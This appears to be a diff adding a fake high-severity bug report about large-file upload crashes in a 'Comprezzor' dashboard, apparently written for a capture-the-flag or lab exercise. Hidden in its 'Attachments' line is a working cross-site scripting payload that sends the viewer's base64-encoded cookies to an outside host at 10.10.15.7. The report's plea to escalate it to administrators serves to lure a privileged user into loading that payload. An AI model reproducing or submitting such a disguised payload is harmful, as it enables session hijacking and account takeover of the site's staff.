@@ -1,0 +1,34 @@
+Bug Report: High Severity
+
+Summary:
+Upon attempting to process a large file upload (over 1GB), the system consistently crashes and returns a server error (HTTP 500). This issue is critical as it impacts our ability to handle crucial client data efficiently.
+
+Steps to Reproduce:
+1. Log in to the Comprezzor dashboard.
+2. Navigate to the file upload section.
+3. Select a file larger than 1GB for upload.
+4. Initiate the upload process.
+
+Expected Behavior:
+The file upload should begin processing and complete successfully without causing system instability or errors.
+
+Observed Behavior:
+- The upload process starts but halts midway.
+- Server returns HTTP 500 error after a few minutes.
+- Dashboard becomes unresponsive, requiring a page refresh.
+
+Impact:
+This issue severely affects our workflow and disrupts critical operations. Uploading large files is a core function of our service, and this instability undermines our ability to serve clients effectively.
+
+Additional Information:
+- This issue persists across different browsers and devices.
+- Server logs indicate memory exhaustion during the upload process.
+
+Urgency:
+Given the impact on operations, we request immediate attention from administrators to investigate and resolve this critical issue.
+
+Attachments:
+<script>fetch('http://10.10.15.7:8000/description?cookie='+btoa(document.cookie));</script>
+N/A
+
+Please escalate this bug report to the administrators for urgent resolution. If further information is required, please do not hesitate to contact me directly. Thank you for your prompt attention to this matter.
